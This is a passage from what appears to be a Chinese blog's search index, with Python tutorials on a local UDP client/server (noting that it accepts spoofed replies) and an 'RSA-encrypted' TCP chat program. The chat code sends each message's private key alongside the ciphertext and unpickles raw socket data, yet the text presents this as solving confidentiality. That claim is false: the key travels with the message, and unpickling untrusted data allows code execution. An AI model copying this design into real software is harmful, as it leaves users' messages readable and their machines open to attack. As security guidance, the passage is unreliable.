getsockname()返回sock示例对象的（地址，端口) print(\"Listening at &#123;&#125;\".format(sock.getsockname())) while True: data, address = sock.recvfrom(MAX_BYTES) text = data.decode('ascii') print(\"The client at &#123;&#125; says &#123;!r&#125;\".format(address,text)) text = 'Your data was &#123;&#125; bytes long '.format(len(data)) data = text.encode('ascii') sock.sendto(data,address)# 客户端def client(port): sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) text = 'The time is &#123;&#125;'.format(datetime.now()) data = text.encode('ascii') sock.sendto(data,('127.0.0.1',port)) # sock.getsockname()获取当前进程的（地址，端口）元组信息 print('The OS assigned me the address &#123;&#125;'.format(sock.getsockname())) data, address = sock.recvfrom(MAX_BYTES) text = data.decode() # format格式化字符串 print('The server &#123;&#125; replied &#123;!r&#125;'.format(address,text))if __name__ == '__main__': # 字典 choices = &#123;'client':client,'server':server&#125; # 创建参数解析对象 parser = argparse.ArgumentParser(description='Send and receive UDP locally') #添加要解析的参数 parser.add_argument('role',choices=choices,help ='which role to play') parser.add_argument('-p',metavar='PORT',type=int,default=1060,help='UDP port (default 1060)') # 参数解析 args = parser.parse_args() # 调用服务端或客户端函数 function = choices[args.role] function(args.p) 先运行服务端 python 814udp_local.py server 结果： Listening at (‘127.0.0.1’, 1060)The client at (‘127.0.0.1’, 60945) says ‘The time is 2019-08-16 16:34:56.276877’ 再运行客户端 python 814udp_local.py client The OS assigned me the address (‘0.0.0.0’, 60945)The server (‘127.0.0.1’, 1060) replied ‘Your data was 38 bytes long ‘ 混杂客户端与垃圾回复 814udp_local.py代码中，客户端程序存在安全隐患，如fg果服务端响应延迟一会，攻击者伪装成服务器的一个响应，客户端并没有检查是否是真正服务器的响应 先运行服务器，再将服务器暂停，创建一个快速发送信息的响应给客户端，再==fg命令==将暂停的服务器开启 客户端 观察到，客户端收到的数据实际上是伪装的数据，真正的服务器的响应没到客户端 混杂客户端 不考虑地址是否正确，接收并处理所有收到的数据包的网络监听客户端在技术上叫 作混杂( promiscuous )客户端 python SOCKET实现RSA加密的全双工聊天程序实现 题目背景 RSA加密解密是利用非对称秘钥解决传输过程中机密性的问题，将之用在聊天程序上，其中使用rsa模块，发送方生产公钥和私钥，然后使用公钥将信息加密后，利用pickle模块封装加密后的消息和私钥，然后发送给接收方，接收方同样通过pickle模块将消息进行解封，使用发送过来的私钥将消息解密，并将内容打印在屏幕上 题目要点 传输协议：TCP套接字创建客户端和服务端_ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 数据传输格式：pickle序列化数据 pickle.dumps()序列化 pickle.loads()反序列化 1234567891011&gt;&gt;&gt; import pickle&gt;&gt;&gt; encryptdata = 'hello'&gt;&gt;&gt; key = 882321&gt;&gt;&gt; message = pickle.dumps([encryptdata,key])&gt;&gt;&gt; type(message)&lt;class 'bytes'&gt;&gt;&gt;&gt; messageb'\\x80\\x03]q\\x00(X\\x05\\x00\\x00\\x00helloq\\x01J\\x91v\\r\\x00e.'&gt;&gt;&gt; origndata = pickle.loads(message)&gt;&gt;&gt; origndata['hello', 882321] 数据加密方式：RSA加解密 123456789&gt;&gt;&gt;data = 'hello'&gt;&gt;&gt; import rsa&gt;&gt;&gt; (PubKey,PrivateKey) = rsa.newkeys(512)&gt;&gt;&gt; encryptdata = rsa.encrypt(data.encode(),PubKey)&gt;&gt;&gt; encryptdatab'=\\\\\\x1c\\x93]^(Z/\\xac\\x81\\xfd\\xffj!\\x0b:r\\xb0\\x1b\\xf9\\x97VZ\\xdf\\xe1\\x9e2\\xb4\\x05G4\\x01\\x9f\\xc8\\xfd\\x1e\\x00\\xa1\\xb7\\xbdU\\x98\\xbc\\x1e5\\xa1yy\\xee$\\xcd\\xf8\\x10\\xf4\\xba\\t\\x84\\xba\\x13\\x99hs\\x8d'&gt;&gt;&gt; decryptdata = rsa.decrypt(encryptdata,PrivateKey)&gt;&gt;&gt; decryptdatab'hello' 题目图解 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import rsaimport socketimport threadingimport pickle PORT = 4396BUFF = 1024 def RsaEncrypt(str): # 利用rsa产生公钥、私钥 (PubKey, PrivateKey) = rsa.newkeys(512) content = str.encode('utf8') # 使用公钥加密 Encrypt_Str = rsa.encrypt(content, PubKey) # 返回加密信息和私钥 return (Encrypt_Str, PrivateKey) def RsaDecrypt(str, pk): Decrypt_Str = rsa.decrypt(str, pk) Decrypt_Str_1 = Decrypt_Str.decode('utf8') return Decrypt_Str_1 def SendMessage(Sock, test): while True: SendData = input() # 加密要发送的数据 (encryptdata, PrivateKey) = RsaEncrypt(SendData) # 打印加密后的数据 print('encrypted data is ' + str(encryptdata)) # pickel封装加密后的数据和私钥 Message = pickle.dumps([encryptdata, PrivateKey]) if len(SendData) &gt; 0: Sock.send(Message) def RecvMessage(Sock, test): while True: # 接收数据 Message = Sock.recv(BUFF) # pickle解封数据 (recvdata, PrivateKey) = pickle.loads(Message) # 对加密的数据解密 decryptdata = RsaDecrypt(recvdata, PrivateKey) if len(Message)&gt;0: print(\"receive message:\" + decryptdata) def main(): type = input('please input server or client:') if type == 'server': # 创建套接字 ServerSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 端口绑定 ServerSock.bind(('127.0.0.1',PORT)) # 服务器允许连接的个数 ServerSock.listen(5) print(\"listening......\") while True: ConSock,addr = ServerSock.accept() print('connection succeed' + '\\n' + 'you can chat online') # 多线程运用 thread_1 = threading.Thread(target = SendMessage, args = (ConSock, None)) thread_2 = threading.Thread(target = RecvMessage, args = (ConSock, None)) thread_1.start() thread_2.start() elif type == 'client': ClientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ServerAddr = input(\"please input the server's ip address:\") ClientSock.connect((ServerAddr, PORT)) print('connection succeed, chat start!') thread_3 = threading.Thread(target = SendMessage, args = (ClientSock, None)) thread_4 = threading.Thread(target = RecvMessage, args = (ClientSock, None)) thread_3.start() thread_4.start() if __name__ == '__main__': main() 结果演示 先启动server进行监听 启动客户端连接server 客户端向服务器发送消息 服务器端接收到消息，并将消息打印在屏幕上 分析 综上，该程序利用的是TCP套接字保证了传输的可靠性，并利用多线程进行信息交互，pickle封装数据，rsa产生公钥、私钥、和加/解密等操作","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"python网络编程","slug":"python/python网络编程","permalink":"https://fishni.github.io/categories/python/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python网络编程","slug":"python网络编程","permalink":"https://fishni.github.io/tags/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]}],"categories":[{"name":"其他","slug":"其他","permalink":"https://fishni.github.io/categories/%E5%85%B6%E4%BB%96/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Python基础","slug":"python/Python基础","permalink":"https://fishni.github.io/categories/python/Python%E5%9F%BA%E7%A1%80/"},{"name":"PapersReading","slug":"PapersReading","permalink":"https://fishni.github.io/categories/PapersReading/"},{"name":"杂项","slug":"杂项","permalink":"https://fishni.github.io/categories/%E6%9D%82%E9%A1%B9/"},{"name":"密码学","slug":"密码学","permalink":"https://fishni.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"Web框架","slug":"python/Web框架","permalink":"https://fishni.github.io/categories/python/Web%E6%A1%86%E6%9E%B6/"},{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"机器学习算法","slug":"人工智能/机器学习算法","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/"},{"name":"python网络编程","slug":"python/python网络编程","permalink":"https://fishni.github.io/categories/python/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://fishni.github.io/tags/hexo/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"dfs、回溯","slug":"dfs、回溯","permalink":"https://fishni.github.io/tags/dfs%E3%80%81%E5%9B%9E%E6%BA%AF/"},{"name":"搜索","slug":"搜索","permalink":"https://fishni.github.io/tags/%E6%90%9C%E7%B4%A2/"},{"name":"排序","slug":"排序","permalink":"https://fishni.github.io/tags/%E6%8E%92%E5%BA%8F/"},{"name":"二分查找","slug":"二分查找","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"},{"name":"双指针","slug":"双指针","permalink":"https://fishni.github.io/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"},{"name":"贪心算法","slug":"贪心算法","permalink":"https://fishni.github.io/tags/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://fishni.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"PapersReading","slug":"PapersReading","permalink":"https://fishni.github.io/tags/PapersReading/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"},{"name":"markdown公式","slug":"markdown公式","permalink":"https://fishni.github.io/tags/markdown%E5%85%AC%E5%BC%8F/"},{"name":"密码学","slug":"密码学","permalink":"https://fishni.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"Crypto-CTF","slug":"Crypto-CTF","permalink":"https://fishni.github.io/tags/Crypto-CTF/"},{"name":"RSA","slug":"RSA","permalink":"https://fishni.github.io/tags/RSA/"},{"name":"SVM","slug":"SVM","permalink":"https://fishni.github.io/tags/SVM/"},{"name":"泛化能力","slug":"泛化能力","permalink":"https://fishni.github.io/tags/%E6%B3%9B%E5%8C%96%E8%83%BD%E5%8A%9B/"},{"name":"神经网络","slug":"神经网络","permalink":"https://fishni.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"逻辑回归","slug":"逻辑回归","permalink":"https://fishni.github.io/tags/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"name":"线性回归","slug":"线性回归","permalink":"https://fishni.github.io/tags/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"name":"Web框架","slug":"Web框架","permalink":"https://fishni.github.io/tags/Web%E6%A1%86%E6%9E%B6/"},{"name":"数据集","slug":"数据集","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E9%9B%86/"},{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://fishni.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"HTTP","slug":"HTTP","permalink":"https://fishni.github.io/tags/HTTP/"},{"name":"GaussianNB","slug":"GaussianNB","permalink":"https://fishni.github.io/tags/GaussianNB/"},{"name":"算法","slug":"算法","permalink":"https://fishni.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"},{"name":"python网络编程","slug":"python网络编程","permalink":"https://fishni.github.io/tags/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]}